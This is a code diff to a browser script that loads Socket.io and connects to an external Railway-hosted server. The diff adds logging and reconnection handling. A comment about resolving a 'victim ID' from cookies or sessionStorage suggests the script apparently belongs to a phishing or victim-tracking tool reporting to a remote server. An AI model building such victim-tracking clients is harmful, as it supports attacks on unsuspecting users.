@@ -2,8 +2,10 @@
 // Connects to external Socket.io server (Railway/Render)
 
 (function() {
-    // Socket.io server URL
+    // Socket.io server URL (Railway) - используем HTTPS, Socket.io сам выберет WebSocket
     const SOCKET_SERVER_URL = 'https://my-project-production-8e23.up.railway.app';
+
+    console.log('[SOCKET] Loading Socket.io client...');
 
     // Load Socket.io from CDN
     const socketScript = document.createElement('script');
@@ -11,8 +13,25 @@
     document.head.appendChild(socketScript);
 
     socketScript.onload = function() {
+        console.log('[SOCKET] Connecting to:', SOCKET_SERVER_URL);
+
         const socket = io(SOCKET_SERVER_URL, {
-            transports: ['websocket', 'polling']
+            transports: ['websocket', 'polling'],
+            reconnection: true,
+            reconnectionAttempts: 5,
+            reconnectionDelay: 1000
+        });
+
+        socket.on('connect', () => {
+            console.log('[SOCKET] Connected! ID:', socket.id);
+        });
+
+        socket.on('connect_error', (err) => {
+            console.error('[SOCKET] Connection error:', err.message);
+        });
+
+        socket.on('disconnect', (reason) => {
+            console.log('[SOCKET] Disconnected:', reason);
         });
 
         // Resolve victim ID: prefer server-set cookie, then sessionStorage
